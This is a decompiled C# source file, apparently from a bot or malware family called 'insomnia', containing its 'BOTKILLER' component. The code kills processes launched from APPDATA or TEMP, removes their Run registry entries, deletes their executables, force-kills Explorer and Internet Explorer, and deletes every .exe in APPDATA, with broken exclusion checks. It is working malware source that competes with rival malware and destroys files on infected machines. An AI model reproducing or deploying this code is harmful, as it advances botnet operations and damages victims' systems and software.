using System;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;

namespace insomnia;

internal class Class28
{
	public static string[] Field1 = Class33.Method2();

	public static void Method5()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				if ((process.MainModule!.FileName!.Contains(Environment.GetEnvironmentVariable("APPDATA")) || process.MainModule!.FileName!.Contains(Environment.GetEnvironmentVariable("TEMP"))) && !process.ProcessName.Contains(Class26.Field21))
				{
					Method4(process.ProcessName, process.MainModule!.FileName);
				}
			}
			catch
			{
			}
		}
	}

	public static void Method4(string A_0, string A_1)
	{
		Method3(A_0, A_1);
		Method2(A_0, A_1);
	}

	public static void Method3(string A_0, string A_1)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
			string[] valueNames = registryKey.GetValueNames();
			foreach (string text in valueNames)
			{
				if (registryKey.GetValue(text)!.ToString()!.Contains(A_1) && text != Class26.Field5)
				{
					Class31.Method3("[BOTKILLER]: Removing registry key -> (HKCU\\" + text + ")", Class26.Field4);
					Class39.Method3("HKCU", text);
				}
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
			string[] valueNames2 = registryKey2.GetValueNames();
			foreach (string text2 in valueNames2)
			{
				if (registryKey2.GetValue(text2)!.ToString()!.Contains(A_1) && text2 != Class26.Field5)
				{
					Class31.Method3("[BOTKILLER]: Removing registry key -> (HKLM\\" + text2 + ")", Class26.Field4);
					Class39.Method3("HKLM", text2);
				}
			}
		}
		catch
		{
		}
	}

	public static void Method2(string A_0, string A_1)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName(A_0);
			foreach (Process process in processesByName)
			{
				if ((!(A_0 != "Dropbox") && !(A_0 != "chrome")) || Class26.Field20.Contains(A_0))
				{
					continue;
				}
				string[] field = Field1;
				foreach (string text in field)
				{
					if (text.Contains("TCP"))
					{
						string[] array = Regex.Split(text, "\\s+");
						if (Process.GetProcessById(Convert.ToInt32(array[5])).ProcessName == process.ProcessName)
						{
							Class31.Method3("[BOTKILLER]: Found outgoing connection from " + process.ProcessName + " -> " + array[3], Class26.Field4);
						}
					}
				}
				process.Kill();
				process.WaitForExit();
				File.SetAttributes(A_1, FileAttributes.Normal);
				File.Delete(A_1);
				Class31.Method3("[BOTKILLER]: Removed file [path='" + A_1 + "']", Class26.Field4);
				Thread.Sleep(200);
			}
		}
		catch
		{
		}
	}

	public static void Method1()
	{
		Process[] processesByName = Process.GetProcessesByName("explorer");
		foreach (Process process in processesByName)
		{
			try
			{
				process.Kill();
				process.WaitForExit();
			}
			catch
			{
			}
		}
		Process[] processesByName2 = Process.GetProcessesByName("iexplore");
		foreach (Process process2 in processesByName2)
		{
			try
			{
				process2.Kill();
				process2.WaitForExit();
			}
			catch
			{
			}
		}
		try
		{
			string[] files = Directory.GetFiles(Environment.GetEnvironmentVariable("APPDATA"), "*.exe");
			string[] array = files;
			foreach (string text in array)
			{
				string text2 = text;
				string text3 = text.Substring(0, text.Length - 4);
				text3 = text.Substring(0, text2.Length);
				if (!text.Contains("Dropbox") || !text.Contains("chrome"))
				{
					File.Delete(text2);
					Method3(text3, text2);
					Class31.Method3("[BOTKILLER]: Removed file [path='" + text2 + "']", Class26.Field4);
				}
				Thread.Sleep(200);
			}
			Process.Start("explorer.exe");
		}
		catch
		{
			Process.Start("explorer.exe");
		}
	}
}
